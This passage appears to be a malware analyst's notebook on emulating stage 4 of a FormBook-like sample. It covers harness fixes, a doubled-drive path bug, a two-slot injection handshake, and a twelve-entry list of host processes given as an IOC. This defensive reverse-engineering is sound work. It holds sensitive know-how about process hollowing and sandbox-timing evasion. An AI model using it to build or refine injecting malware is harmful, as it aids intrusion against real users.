| C4 | The crash still happens, and WER still records stage 3's `5ff2b99b` |

**C3 is the one worth stating loudly.** If it holds, the gate is not what this
project thinks it is and both "broken build" and "deliberate bail" survive with
one more route closed. If it *fails* — something really does hash to it — then
the gate was right all along, and the next question is what put that module in
`RegSvcs`, **including this pipeline's own tooling**, which has already
contaminated two detectors (`WerFault.exe` supplied 30 of 41 opens on one,
`procdump64.exe` 18 of 60 on another).

**The negative has a bound and the script says so**: an image loaded and
unloaded outside Procmon's window would not appear. That is not a reason to skip
the run; it is a reason not to write "proved" afterwards.

#### 0au. CLOSED — does the real `CreateProcessW` see `C:C:\`? Yes, and it refuses it

> **Answered 17 Aug without a detonation, see `0be`.** `ERROR_INVALID_NAME`, for
> all twelve candidates, measured against the real API on this bench — whether
> Windows accepts an `lpApplicationName` was never a malware question. The
> queued run below is superseded; it is kept because its framing of *what would
> distinguish the readings* is what made the cheap answer recognisable as
> sufficient.

**Blocked, and queued anyway with the blocker named.** Read the dependency
before spending a revert cycle on it.

**The question, one bit.** Under emulation stage 4 builds
`C:C:\Windows\System32\compact.exe` and every candidate after it. Four
black-box inputs say that is the routine's own transformation (*0aq*), and
nothing downstream repairs it (*0as*). A detonation would show the string a real
`CreateProcessW` is handed, and there are only two answers.

**Pre-registered predictions, before the run:**

| | prediction |
|---|---|
| P1 | Procmon logs a `CreateFile` naming a path containing `C:C:\`, from the injected process, with a failing result (`NAME INVALID` or `PATH NOT FOUND`) |
| P2 | **No** `Process Create` for any of the twelve candidates |
| P3 | The twelve appear in list order, `compact.exe` first, `write.exe` fourth |
| P4 | Twelve `CreateFile` attempts, not eleven — the guest's `SysWOW64` decides which open, and that is a property of the machine rather than the sample |

**P1 failing is the interesting outcome**, not P1 holding. A well-formed
`C:\Windows\System32\compact.exe` on the guest would mean the emulator still
diverges somewhere this file has not found, and `0aq`–`0at` would need reopening.

**No config change is needed, and that is worth saying out loud.** Both
`dynamic_default.pmc` and `dynamic_registry_reads.pmc` already include
`CreateFile` and `Process Create`:

    Process Create, Process Start, Process Exit, Load Image, CreateFile, ...

The registry-read saga cost three consecutive runs to a missing operation in the
filter. This observable is in both configs, checked with
`procmon_config.describe_procmon_filter` rather than assumed.

**THE BLOCKER: stage 4 has never run on the guest.** Eleven detonations have
ended in the stage-3 crash — `RegSvcs` faulting on `0x32dfd514` — and that crash
fires at ~17.3M blocks under emulation, far before the injection at ~537M. No
injection means no stage 4 means no `CreateProcessW` to observe. **This run
cannot answer its question until the crash is resolved**, and the crash already
has its own one-bit question queued: `0xe11da208` matches nothing among the 931
modules the guest had loaded, yet the guest took the branch anyway. **Run that
first. This entry is the one that follows it**, and it costs nothing extra —
the same capture answers both.

**If the crash is resolved and stage 4 still does not run**, the next thing to
check is whether stage 3 reached its `NtCreateSection`/`NtMapViewOfSection` pair
at all, because on the guest it has never been observed doing so either.

#### THE NEXT QUESTION — is emulating the peer worth it, or is this the end?

The rendezvous cannot be satisfied by anything this emulator does to itself. The
three options, and none is obviously right:

- **Accept the boundary.** Stage 4's behaviour up to the wait is fully mapped and
  the injection is proven by structure, by stage 3 having run the identical
  sequence, and by `--force-ready`. That may be all the emulator owes.
- **Model a second context inside the child**, not the loader. `0ao` rules the
  loader out: it signals once and exits without touching the block. What is
  missing is a second thread in the injected process plus a message queue to
  carry the loader's `WM_COMMAND` — the requester at `+0x03e70` has ordinary
  direct callers, so it is reachable code waiting on a context to run it. Large,
  and the first change here that would be building an emulator feature rather
  than closing a stub.
- **Go back to detonation.** A real machine has the peer for free. The section
  is RWX and carries the stage-4 image; what crosses the channel is small (the
  forced run's section was 4 KB), so it is a message, not a body.

**And a warning about the shape of the answer.** Four harness gaps were closed on
16 Aug and each moved the payload further, which makes "close the fifth" the
reflex. This one is not a stub. Serving a request that nothing sent would be
inventing the peer, and the eleven-host walk (*0af*) is the standing proof that
an invented answer reads convincingly as the sample's behaviour.

#### 0ai. THE GATE — two six-second rendezvous, and the injection behind one

Measured by `scripts/stage4_gate.py`, which hooks the two `cmp` sites directly
and watches the words they read. Nothing here is inferred from a disassembly
reading; the disassembly only says where to put the hooks.

    [60,774,973blk] +0x03f8e  [0x3eee884] = 0   not ready   x6, 1s apart
    [60,778,210blk] +0x03fa2  wrote -1 to 0x3eee884         <-- timeout
    [60,778,857blk] +0x040ae  [0x3eee874] = 0   not ready   x6, 1s apart
    [60,782,094blk] +0x040b9  wrote -1 to 0x3eee874         <-- timeout

**Writes to either word between the first check and the end of the run: two,
both the timeouts themselves.** Nothing else touches them, so the poll cannot
succeed here however long it waits. Six seconds is not a stall, it is a
deadline.

**The protocol, both halves, all in this image.** The words are two slots of one
control block at `0x3eee874` — outside the payload image, `0x18000` past its end,
so in the stage-3 allocation that carries it:

    0 = idle    1 = request posted    2 = served    -1 = failed

    requester  +0x03e70   [blk+0x34] = tid; [blk+0x30] = pid; [blk+0x10] = 1
                          then waits up to 6s for 2 or -1
    server     +0x03f40   waits up to 6s for 1, then CreateSection /
                          OpenProcess(pid,tid) / MapViewOfSection x2, sets 2
    requester  +0x03ee0   [blk] = 1, waits for 2
    server     +0x04090   waits for 1, then NtResumeThread, sets 2

**Stage 4 ran the server side of both and never the requester side.** That is
not an inference: all twelve sleeps come from the two server sites, `+0x03f86`
and `+0x040a6`, six each, and the requester's own sleep sites (`+0x03ea6`,
`+0x03f06`) never fire. `stage4_backtrace.py` prints the frames.

**The requester is called directly, from `+0x1654c` and `+0x16900`. The server
is not called from anywhere** — no direct `call` or `jmp` in the image targets
`+0x03f40` or `+0x04090`, and neither address appears as a literal dword. It is
dispatched through a computed pointer, which is what the nine indirect call
sites of `0aa` are for.

#### 0aj. The forced run — what is behind the gate, and what still is not

`stage4_gate.py --force-ready` writes 1 into the first state word at the first
check. **This is feeding the payload an answer, not fixing the harness**, and it
is here to show behaviourally what the disassembly says structurally. Nothing
measured under it is evidence about the sample's environment.

    plain        60,928,346 blocks   no NtCreateSection, no NtOpenProcess
    --force-ready 67,819,385 blocks   1 NtCreateSection  1 NtOpenProcess
                                      2 NtMapViewOfSection, state word set to 2
    --force-all   71,152,676 blocks   the above + 1 NtResumeThread, both words 2

**And here is what the forced run cannot show.** The section is 4,096 bytes and
**nothing is ever written into the view** — `section_writes` records the mapping
with zero spans. `NtOpenProcess` is called with **pid 0**. Both follow from the
same fact: the target's pid/tid and the bytes to inject are what the *requester*
supplies, and the requester never ran. So this proves the path is injection and
that it is reached; it says nothing about what would land in `compact.exe`.

**Two harness notes fell out of it.** `NtOpenProcess` reported `opened: True`
for pid 0, which is not in `served_process_list()` — the refusal that the
explorer-child work put there does not cover a zero pid. And the section is
granted at the size asked for, 4 KB, which is far too small for a 273 KB image:
whatever crosses this channel is a message, not a body.

#### 0ak. RETRACTED — `0ag`'s "the twelve sleeps wait for nothing"

`0ag` concluded the twelve sleeps were "a 12-second delay chunked into twelve
one-second sleeps, which is the standard shape for defeating sandboxes that
patch out or skip long waits", on the measurement that "every address read
during an iteration is its own stack (`0x1007f9xx`) — no read of the spawned
PEB, none of the mapped host image".

**Every word of the timing measurement holds and the conclusion is wrong.** They
really are twelve exactly-1,000.0ms non-alertable sleeps returning to `+0x29d46`.
But they are two loops of six, not one of twelve, and each iteration reads
`[0x3eee884]` or `[0x3eee874]` — neither of which is the spawned PEB or the host
image, which is why a probe looking for *those* saw only stack. The read is
there: the same window shows 88 heap reads alongside the 77,399 stack ones.

**The method note.** `0ag` asked "does the loop touch the target?", got no, and
answered a larger question — "does it wait for anything?" — with that no. The
loop waits on a word that has nothing to do with the target it just created.
Ask what a loop *reads*, not whether it reads a particular thing.

#### 0al. RESOLVED — the malformed `lpApplicationName` is this harness's

`0ac` left this "Unresolved": `lpApplicationName` reads
`ntdll.dll\Windows\SysWOW64\<target>.exe`, with the payload itself writing
`ntdll.dll` into the buffer at `+0x2c876`, so it was ruled not to be residue of
the `FileNameInformation` answer. Correct on both counts, and it is still ours.

`+0x192b0` builds the system directory by looking a module up and taking
**`entry + 0x28`, which is `FullDllName.Buffer`**. (This entry first said "by
hash (`0x2c6e6e44`)". Wrong on both halves — **see `0ar`**: the literal is
decoded by `+0x14350` into a *base address*, and the lookup at `+0x2c130` is by
base, not by name hash.) `win32_emu_env.py:890` writes the *same*
`UNICODE_STRING` to `+0x24` and `+0x2C`:

    us = struct.pack("<HHI", len(nm) * 2, len(wide), nptr)
    mu.mem_write(e + 0x24, us)                    # FullDllName
    mu.mem_write(e + 0x2C, us)                    # BaseDllName

On real Windows `FullDllName` is `C:\Windows\SysWOW64\ntdll.dll` and
`BaseDllName` is `ntdll.dll`. Here both are the leaf, so the payload's derivation
starts from `ntdll.dll` and the path is malformed from the first character.

**It has not mattered so far, and only by luck**: `Emulator.backing()` resolves a
file by leaf name, so the harness silently repaired the path it had itself
broken, and `CreateProcessInternalW` returns 1 without looking at the path at
all. A real machine fails that call.

**FIXED, and it half-resolved the symptom — read `0ap` before assuming the app
name is now good.** `winenv.repair_loader_full_names()` walks
`InLoadOrderModuleList` and gives each entry a real `FullDllName`, leaving
`BaseDllName` the leaf. It runs from `setup()` *and* from `restore()`, because
`restore()` rebuilds the syscall gate and the export tables but not the loader
entries, and a fresh-runs-only fix would never reach the stored states stage 4 is
actually run from — the trap `0c` documents, dodged for the third time.

#### 0ap. The FullDllName fix lands, and the path is still malformed

All 23 entries now carry the paths a 32-bit process on this host would report --
`C:\Windows\SysWOW64\<dll>` for the modules, and
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe` for the image. Both
directories are **real on this machine**, not invented. Idempotent: a second call
writes 0. 626 tests pass.

**One thing it fixed outright.** The ntdll open is now well formed:

    before  \??\ntdll.dll\Windows\SysWOW64\c...
    after   \??\C:\Windows\System32\ntdll.dll

**`System32`, not `SysWOW64`, and the first version of this fix got that wrong.**
A WOW64 process has two loader lists and the one a 32-bit payload walks records
the *unredirected* path; the redirector turns it into `SysWOW64` at open time.
Measured on this host rather than reasoned about — a 32-bit
`powershell.exe` reports `ntdll.dll -> C:\WINDOWS\SYSTEM32\ntdll.dll`. The
check only happened because `0au` was about to spend a detonation on the
question, and **none of the four black-box inputs in `0aq` was the real one**.
`resolve_dos_path` models the redirector to match, with no fallback to the
64-bit directory when it misses.

**It changes nothing about the doubling.** Re-run with the faithful input the
census is identical — 120,090,809 blocks, eleven failing creates, same call
counts — and the path is `C:C:\Windows\System32\compact.exe`. The transformation
doubles whatever volume it is given, which is what `0aq`'s `D:\Foo\Bar` row
already said.

**And one it did not.** `lpApplicationName` changed and is still wrong:

    before  ntdll.dll\Windows\SysWOW64\compact.exe
    after   C:C:\Windows\SysWOW64\compact.exe        <-- doubled drive

Everything else is unchanged — 60,928,325 blocks against 60,928,346 (the
difference is string lengths), same API census, still reaches both rendezvous and
still times out. So the fix is right and **`0ac` caveat 2 is only half closed**.

**What is measured about the second cause, and what is not.** Hooking the call
and its return: the wrapper `+0x27ef0` is handed `C:\Windows\SysWOW64\ntdll.dll`
and returns `C:C:\Windows\SysWOW64\` — so the doubling happens inside, and the
`SysWOW64\` is appended there rather than by the caller's `[edi+0x784]` branch as
this file assumed. The real body is `+0x117a0`, and **it does not disassemble**:
capstone desynchronises a few instructions past the prologue, which is the
obfuscated-region problem, not a bad address.

Its read census over that one call:

    2,631,240  its own stack
        3,815  inside ntdll's export directory (0x7711fd78, 0x771260a8+)
          142  heap

The 3,815 are an export resolution by name, not path work. This entry guessed
that the doubling was "still almost certainly ours" and named
`ProcessParameters` as the suspect — **both settled in `0aq`, and the guess was
wrong.**

**One negative in that probe is VOID, recorded so nobody trusts it.** It also
counted "reads carrying 'C' or ':'" and reported zero. That means nothing:
unicorn does not populate the `value` argument of `UC_HOOK_MEM_READ`, so the test
was against a constant 0. Only the region counts above survive.

#### 0aq. The doubled drive is the SAMPLE's, not ours — and ProcessParameters is dead

**The suspect first.** `scripts/peb_reads.py` watches the whole PEB page for a
full run. Stage 4 reads **one field, four times**:

    +0x00c   4 reads   Ldr   by +0x2c057, +0x2bed7

`ProcessParameters` at `+0x10` is **never read**. So the fact that this harness
leaves it zero cannot be the source of anything, and populating it would be
answering a question nothing asks — the same disproof shape as `ApiSetMap` in
`0d`. Suspect dead, for the cost of one narrow hook. (A read hook restricted to
one page is nearly free: unicorn filters the range in C.)

**Then the builder, identified black-box.** Its body does not disassemble, so
`scripts/probe_path_builder.py` overrides ntdll's `FullDllName`, runs to the
call and prints what comes back. Four inputs:

| given | returns |
|---|---|
| `C:\Windows\SysWOW64\ntdll.dll` | `C:C:\Windows\SysWOW64\` |
| `D:\Foo\Bar\ntdll.dll` | `D:D:\Foo\Bar\` |
| `\Windows\SysWOW64\ntdll.dll` | `\Windows\SysWOW64\` |
| `ntdll.dll` | `ntdll.dll\Windows\SysWOW64\` |

**All four fit one rule**: take the prefix up to the first backslash, then append
the module's own directory — falling back to the literal `\Windows\SysWOW64\`
when the input has no directory at all. The fourth row is what makes it a rule
rather than a story: it reproduces the pre-fix behaviour exactly, from a
hypothesis formed on the first three.

**So the doubling is what the routine does with a correct input.** The `D:` row
is the load-bearing one — the prefix follows the input, so it is not a stray `C:`
leaking in from this harness. A real WOW64 process has
`FullDllName = C:\Windows\SysWOW64\ntdll.dll`, and that is precisely the input
that produces `C:C:\`. **`0ap`'s "still almost certainly ours" is retracted.**

**What that leaves open, stated plainly rather than resolved.** The intended
construction is obviously `volume + \Windows\SysWOW64\`, and the routine appends
the *whole* directory instead of the volume-relative part. `CreateProcessW` with
that name and a NULL `lpCommandLine` fails on a real machine, so on this path
every one of the twelve candidates would fail and `prepare_host` would return 0.
Three readings survive and nothing here chooses between them:

1. the branch is genuinely broken in this sample and never injects by this route;
2. ~~the hash `0x2c6e6e44` resolves to a different module on a real machine, one
   whose `FullDllName` has no volume~~ — **ELIMINATED, see `0ar`**;
3. ~~the output is consumed somewhere that strips the leading volume~~ —
   **ELIMINATED, see `0as`**. Only reading 1 survives.

**The `FullDllName` fix stands either way.** It is right on its own terms — a
real 32-bit process has full paths there — and it fixed the ntdll open outright.
It simply was not the cause of the doubled drive.

#### 0ar. It is not a hash and it is not a different module — reading 2 is out

`scripts/which_module.py` reads the value out of EAX at each call boundary
instead of cracking the literal, and the literal turns out not to be a hash:

    literal pushed  0x2c6e6e44
    decoded to      0x77000000        <-- NTDLL_BASE, not a name hash
    lookup returned entry 0x7ffd0200
       BaseDllName 'ntdll.dll'
       FullDllName 'C:\Windows\SysWOW64\ntdll.dll'

So `+0x14350` decodes the constant to a **base address**, and `+0x2c130` is a
find-module-**by-base** lookup, not by name. **Reading 2 is eliminated**: the
module resolved is ntdll, its `FullDllName` is exactly what a real WOW64 process
carries, and nothing about this harness's module list or any hash matching is in
play. Which leaves readings 1 and 3 of `0aq`.

**Cracking `0x2c6e6e44` against filenames would have produced nothing and cost a
day**, and the only reason it was not attempted is that the probe read the
decoded value rather than assuming the literal was the input. The same mistake
in reverse is available everywhere in this image: constants are decoded before
use, so a constant lifted out of a disassembly is rarely the value.

**The CRC work is untouched and still right** — `crc("ntdll.dll")` is
`0x0b4e1ae2`, which `which_module.py` asserts before reporting anything, and
`0a` records `+0x15a0` returning exactly that. There *is* a name-hash function in
this payload; it is simply not the one on this path.

#### 0as. Nothing strips the volume — the path is built once and handed over

`scripts/trace_appname.py` watches the buffer that becomes `lpApplicationName`.
It is `desc + 0x30` at `0x1007fb0c`, and `+0x192b0`'s second argument is **the
same buffer**, so the built path is copied straight in rather than staged.

    72 writes, all from +0x2c876, one byte at a time, +0x000 .. +0x047 ascending
    writes landing at +0x0 (the first character): 1

One pass, strictly ascending, no rewrites, and the leading `C` is written once
and never touched again. **Reading 3 is out.** The buffer reaches
`CreateProcessInternalW` exactly as built:

    buffer now = 'C:C:\Windows\SysWOW64\compact.exe'

**So reading 1 is what is left**: with the `FullDllName` a real WOW64 process
carries, this routine builds a doubled volume, and `CreateProcessW` would reject
it. On a real machine every one of the twelve candidates fails and
`prepare_host` returns 0.

**That qualifies `0af`, and the qualification is load-bearing.** `0af` concluded
"in a working environment it takes the first — `compact.exe`", from the run where
implementing `NtReadVirtualMemory` collapsed the walk from eleven creations to
one. That collapse is real, but it rests on this harness's
`CreateProcessInternalW` returning 1 **without looking at the path** — it is a
`val = 1` with no validation. A real `CreateProcessW` fails on `C:C:\...`, so a
real machine would walk all twelve and create nothing. The twelve-candidate walk
may therefore be closer to real behaviour than `0af` allows, for a reason `0af`
did not consider: the path is malformed regardless of what the read returns.

**A decision, and it was taken — see `0at`.** Validating the path is the
faithful thing and it does invalidate the recorded runs in `0ad`–`0af`. It was
done anyway, and what it changed is larger than expected.

#### 0at. With the path checked, stage 4 never reaches the rendezvous at all

`CreateProcessInternalW` now resolves `lpApplicationName` the way a machine
would (`winenv.resolve_dos_path`: `\??\` and quotes stripped, drive-relative
resolved against the one drive this harness claims, then the file must exist)
and returns **0** when it does not. On failure nothing is invented — no pid, no
handles, no host image — because a failed create that still reports a process is
the contradiction `served_process_list` exists to prevent. Twelve tests in
`dynamic_analysis/tests/test_createprocess_path.py`; 638 pass.

**The census, against the permissive run:**

| | permissive | validating |
|---|---|---|
| blocks | 60,928,325 | **120,090,809** |
| CreateProcessInternalW | 1, succeeds | **11, all fail** |
| NtCreateFile / QueryInfoFile | 2 / 2 | **13 / 13** |
| NtQueryInformationProcess | 1 | **0** |
| NtReadVirtualMemory | 1 | **0** |
| NtDelayExecution | 12 | **0** |

**The whole rendezvous is downstream of a create this harness should never have
granted.** No process, so no `ProcessBasicInformation`; no PEB, so no
`ImageBaseAddress` read; no host prepared, so the injection servicer at
`+0x03f40` is never dispatched and neither six-second poll ever runs. The causal
chain is one line and every link is now measured.

**This qualifies THE QUESTION rather than reversing it.** The injection code is
still there, still unambiguous, and still runs when the poll is answered
(*0aj*) — "does stage 4 intend to inject" is unchanged. What changes is the
route: on a machine that rejects `C:C:\...`, stage 4 walks its twelve candidates,
fails every one, and returns without ever reaching the code that waits to be
asked. **Two independent reasons it does not inject, and the second one gets
there first.**

**And the IOC is complete at last.** Walking all twelve prints every candidate
name, including the one no previous run reached:

    compact.exe   msiexec.exe   AtBroker.exe   write.exe   <-- the twelfth
    runonce.exe   cacls.exe     regini.exe     replace.exe
    wextract.exe  label.exe     netbtugc.exe   SearchFilterHost.exe

`0ad` listed eleven and `0ap` said "one of the twelve never opened; which one,
and why, is not measured". It is `write.exe`, and the reason is mundane: this
host has no `C:\Windows\SysWOW64\write.exe`, so its open fails and the walk skips
to the next before reaching the create. **A machine that has it would show
twelve.** The eleven-name list in `0ad` should be read as eleven-of-twelve.

**What is now conditional on this change.** Every stage-4 run recorded before it
— `0ad` through `0as`, and the `stage4_gate.py` numbers in `0ai`–`0aj` — used the
permissive stub and therefore explored a branch a real machine does not reach.
The findings about *what that branch contains* stand, because they are about
code. The findings about *what stage 4 does* now carry "given a create it should
not have been granted".

**`stage4_gate.py` re-run, and `--force-ready` is now a no-op by construction:**

    POLL CHECKS (0)
    THE POLLS WERE NEVER REACHED.
       Neither +0x03f8e nor +0x040ae executed

`--force-all` produces byte-identical output to the plain run — there is no
check to answer, because the poll sites never execute. The experiment that
proved the injection code runs (*0aj*) is itself unreachable once the create is
faithful, which is the cleanest statement of what `0at` changes.

**And the probe was printing a conclusion about a loop that had not run.** With
zero checks it still said *"nothing in this run ever moves the state word, so the
poll cannot succeed here no matter how long it waits — the six seconds are not a
stall, they are a timeout"*. True of the permissive run, meaningless here. That
is the third instance of this shape in two days — the RUN CHECK in `0aa`,
`stage3_tail.py`'s "no writes" branch, and now this — and all three had the same
cause: a summary line written for the case the author expected, printed
unconditionally. **The RUN CHECK is not enough on its own; each conclusion needs
to name the observation it rests on.**

---

**Superseded, kept because the reasoning is sound and the conclusion holds:**
*what would make stage 4 unpack itself* — answered, the resolutions succeed and
`LdrLoadDll` is the tell.

Converting a matched export name to an address requires reading
`AddressOfNameOrdinals` then `AddressOfFunctions`, so those reads are an exact
success signal. Measured over the full run, payload reads only:

    AddressOfNameOrdinals : 8 reads, 8 distinct indexes
    AddressOfFunctions    : 8 reads, 8 distinct indexes

**Eight lookups, eight successes, zero failures.** Import resolution is *not* the
gate. What it resolves:

    LdrLoadDll                      <-- resolved, NEVER CALLED
    NtCreateFile                    called
    NtQueryInformationFile          called
    NtClose                         called
    RtlDosPathNameToNtPathName_U    called
    RtlAllocateHeap                 called
    RtlFreeHeap                     called (x2)
    RtlGetProcessHeaps              called

**Seven of the eight are called. The exception is `LdrLoadDll`** — the function
stage 4 would use to load the next thing. It resolves the loader, opens
`\??\ntdll.dll`, queries it with `NtQueryInformationFile`, closes it, and then
**declines to load anything**.

So the whole stub reduces to one decision: it prepares to load a module, inspects
`ntdll.dll` on disk, and does not proceed. **That is where the payload stops
being a stealer**, and it is a single branch rather than a region.

#### 0ac. FOUND: the gate was an unimplemented `NtQueryInformationFile` class

Stage 4 asks for **class 9, `FileNameInformation`**, with a 520-byte buffer. The
handler implemented **only class 5**; every other class fell through to
`val = 0` with the caller's buffer untouched. So the payload asked what the file
it had just opened was called, and was told `""` — **successfully**.

    class 9 = FileNameInformation, Length 520
    buffer before: 00 00 00 ... (all zero)
    buffer after : 00 00 00 ... (all zero)   <-- harness wrote nothing, returned SUCCESS

The backing was fine — `\??\ntdll.dll` had all 1,821,376 real bytes. Only the
name query was missing, and it failed by *succeeding*, which is the failure mode
this harness is most prone to and the hardest to notice.

**Implemented** in `emulate_native_stub.py`: `FILE_NAME_INFORMATION` is
`{ULONG FileNameLength; WCHAR Name[]}` and the real one is the path without the
drive, so `\??\ntdll.dll` answers as `\Windows\SysWOW64\ntdll.dll`.

**Stage 4 then goes much further, and it is a process launcher.** With the class
implemented it opens files twice, **reads** one, runs past 52,744,158 blocks, and
reaches **`CreateProcessInternalW`**:

    4 RtlFreeHeap   3 RtlAllocateHeap   2 NtCreateFile   2 NtQueryInformationFile
    2 NtClose       2 RtlDosPathNameToNtPathName_U       1 NtReadFile
    1 RtlGetProcessHeaps                                 1 CreateProcessInternalW

**Two caveats, both unresolved and both load-bearing:**

1. **`CreateProcessInternalW` is UNHANDLED** — the next blocker, and precisely
   the "stub returning nothing" class `stage4_asks.py` flags. Implementing it is
   the obvious next step, and it is where the chain either continues or stops.
2. **The path is malformed, and it is NOT the `FileNameInformation` write.**
   Traced every write into the buffer: the payload itself writes `ntdll.dll`
   there byte by byte at block 43,621,788, from `+0x2c876` — *after* the query
   at 35.9M — then appends `\Windows\SysWOW64\<target>.exe` contiguously, with
   no NUL between the parts. So `lpApplicationName` reads
   `ntdll.dll\Windows\SysWOW64\<target>.exe`. **Not residue, not caused by the
   value returned**, and therefore not fixable by changing what
   `FileNameInformation` answers. **RESOLVED — see 0al**: the payload derives the
   system directory from ntdll's `FullDllName`, and this harness writes the leaf
   name into that field.

#### 0ad. THE HOST TARGET LIST — nine processes, all CREATE_SUSPENDED

With `CreateProcessInternalW` implemented, stage 4 does not create one process.
**It iterates a list of nine**, every one a legitimate SysWOW64 binary and every
one with `CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW` (`0x0800000c`):

    compact.exe    msiexec.exe    AtBroker.exe
    runonce.exe    cacls.exe      regini.exe
    replace.exe    wextract.exe   label.exe

**This is a FormBook host-process candidate list, and it is an IOC** — the second
this chain has produced, and unlike the FLOSS strings it came out of the payload
*running* rather than out of decoders emulated in isolation.

**Retracting what was written one commit earlier.** That entry said the target
"varies between runs — `compact.exe` on one, `label.exe` on the next … random
system-binary selection". Wrong: it is a single ordered walk within one run, and
the two probes had simply caught its first and last entries. The mechanism is a
list, not a random draw, which is a different and more useful fact — the list can
be signatured.

**The list is eleven, not nine** — the first count was itself a truncated run.
Complete, in order, at 3,000,000,000 instructions (122,991,008 blocks, COMPLETE):

    compact.exe   msiexec.exe   AtBroker.exe   runonce.exe
    cacls.exe     regini.exe    replace.exe    wextract.exe
    label.exe     netbtugc.exe  SearchFilterHost.exe

**It is twelve, and the missing one is `write.exe` — see `0at`.** It sits between
`AtBroker.exe` and `runonce.exe`, and no run reached it because this host has no
`C:\Windows\SysWOW64\write.exe`: the walk opens each candidate's file before
creating it, and skips on a failed open. **Read the eleven above as
eleven-of-twelve**, and expect twelve on a machine that carries `write.exe`.

#### 0ae. NO INJECTION — it stops at `ProcessBasicInformation`, unimplemented

Stage 4's own calls, with the loader's baseline subtracted:

       36 RtlFreeHeap        13 NtQueryInformationFile   11 NtQueryInformationProcess
       24 RtlAllocateHeap    13 NtClose                  11 CreateProcessInternalW
       13 NtCreateFile       12 NtReadFile                1 RtlGetProcessHeaps
       13 RtlDosPathNameToNtPathName_U

    UNHANDLED: 11 x NtQueryInformationProcess(class 0x0)

**No `NtCreateSection`, no `NtMapViewOfSection`, no `NtWriteVirtualMemory`, no
`NtOpenProcess`, no thread APIs.** It does not inject.

**A warning about reading this wrong.** The *raw* counters after a run show
`NtCreateSection` ×3, `NtMapViewOfSection` ×6, `NtOpenProcess` ×3 and the thread
calls — which looks exactly like injection. Those are **the loader's**, already
present in `after_handshake.state`, and they are byte-identical to the baseline.
Anything reading `emu.calls` directly rather than subtracting will conclude stage
4 hollows a process. It does not. `stage4_asks.py` subtracts; ad-hoc probes must.

**The loop, fully mapped.** For each of the eleven candidates: build the path →
`NtCreateFile` the host binary → `NtQueryInformationFile` → **`NtReadFile`** it →
`NtClose` → `CreateProcessInternalW` suspended → **`NtQueryInformationProcess`
class 0** → nothing comes back → next candidate. All eleven, then it returns.

**Class 0 is `ProcessBasicInformation`, which returns the PEB address** — exactly
what hollowing needs to locate the target's image base. It is asked once per
created process and answered with nothing.

**This is the third blocker of the same kind in a row**: `FileNameInformation`,
then `CreateProcessInternalW`, now `ProcessBasicInformation`. Each stopped the
payload at the next step, and implementing each revealed the next. That is the
shape of the remaining work — not a mystery about the sample, but a queue of
unimplemented APIs, each cheap to find because the harness names it.

#### 0af. THE ELEVEN-HOST WALK WAS OUR ARTIFACT — corrected

`ProcessBasicInformation` and then `NtReadVirtualMemory` are both implemented,
the latter alongside **per-spawned-process host images**: each created process
gets the real `SysWOW64` binary mapped at `HOST_IMAGE_BASE + n*stride`, its
header's `ImageBase` set back to `0x400000`, and reads of `0x400000` against that
handle translated onto it. Reads of anything else still fail — one address space,
and serving *our* memory as another process's is the self-confirming answer a
hollowing run must never get.

**The pre-fix log shows exactly what it wanted:** every read was
`PebBaseAddress + 8`, four bytes — `ImageBaseAddress` — once per process, all
refused with `STATUS_ACCESS_VIOLATION`.

**And with the read working, the behaviour collapses from eleven to one:**

    before:  11 CreateProcessInternalW, 11 ProcessBasicInformation, 11 failed reads
    after:    1 CreateProcessInternalW, 1  ProcessBasicInformation, 1  read, and
             12 NtDelayExecution

**So the eleven-process walk was a retry loop driven by our failing reads.** It
tried each candidate because each failed. **`0ad` reported "eleven processes
created" as an IOC and that is now qualified**: the eleven *names* are real
candidates embedded in the payload, but creating all eleven was this harness's
doing, not the sample's. In a working environment it takes the first —
`compact.exe`.

**That last sentence is qualified by `0as`.** It holds only because this
harness's `CreateProcessInternalW` returns 1 without inspecting the path, and the
path is malformed — `C:C:\Windows\SysWOW64\compact.exe`. A real `CreateProcessW`
rejects it, so a real machine walks all twelve and creates nothing. The collapse
from eleven to one is a real consequence of fixing the read; "it takes the first"
is not a claim about a real machine.

**Where it now stops.** It creates `compact.exe` suspended, is told
`ImageBaseAddress 0x400000`, reads it, **sleeps twelve times**, and returns
cleanly at 60,928,346 blocks. **Still no injection** — no `NtCreateSection`, no
`NtMapViewOfSection`, no `NtUnmapViewOfSection`, no `NtWriteVirtualMemory`.

#### 0ag. RETRACTED by 0ak: the twelve sleeps wait for nothing

Measured rather than inferred from the shape. All twelve are **1,000.0 ms
exactly**, all `alertable=0`, all returning to the same dispatch thunk at payload
`+0x29d46`, spaced ~647 blocks apart.

**And the loop body touches nothing external.** Every address read during an
iteration is its own stack (`0x1007f9xx`) — **no read of the spawned PEB, none of
the mapped host image** — and the only API it calls is the sleep.

So this is not a poll and not a wait on the target's state: it is a **12-second
delay chunked into twelve one-second sleeps**, which is the standard shape for
defeating sandboxes that patch out or skip long waits. `NS100_PER_BLOCK` means
the emulator's clock advances, so the delay *completes* rather than hanging.

**That relocates the question** — and the tail has now been traced.

#### 0ah. QUALIFIED by 0ai: the tail calls nothing, but the decision was earlier

**The counts below hold; the conclusion drawn from them does not.** "Nothing
after the delay asks the environment for anything, so no further stub, class or
fixture can change what happens there" is true of the *tail* and was read as
true of the run. The decision is taken **before** the tail, at `+0x03f8e` and
`+0x040ae`, on a word this harness never writes — so it is gated on the harness
after all, just not on an API. `0ah`'s own last line ("the decision was taken
earlier, on data already gathered") was right; the data was a state word.

Everything after the twelfth sleep, to the clean return:

    146,255 block entries, 66 distinct blocks
    APIs called after the last sleep: NONE

**Not one API.** 146K entries across 66 blocks is tight looping, and the hottest
are payload `+0xbb25`, `+0xbb42`, `+0xbb99`, `+0xbbb6`, `+0xbbc5` — all in
`0x3e9f7xx`–`0x3e9f8xx`, **the injected stub's own wait region**, the same
neighbourhood as the handshake cell at `0x3e9f8a8` and the 512-million-iteration
stall. So stage 4 finishes, unwinds into the stub's loop, spins ~23,000
iterations, and leaves.

**This is the important negative of the whole sequence.** Four harness gaps were
implemented today and each one moved the payload further. **This one will not
be**: nothing after the delay asks the environment for anything, so no further
stub, class or fixture can change what happens there. The decision was taken
earlier, on data already gathered — or there is no decision and the payload has
simply done all it intends to do in a process it was never told to inject.

**Which means the next question is not "what else is missing".** It is whether
stage 4 *ever* intended to inject here, and that is answered by looking at what
it did with the host it created — it read `ImageBaseAddress` and then waited 12
seconds without touching it again. A hollowing routine that reads a target's base
and then neither unmaps nor writes is not being blocked; it is doing something
else. **Start there, not at another API.**

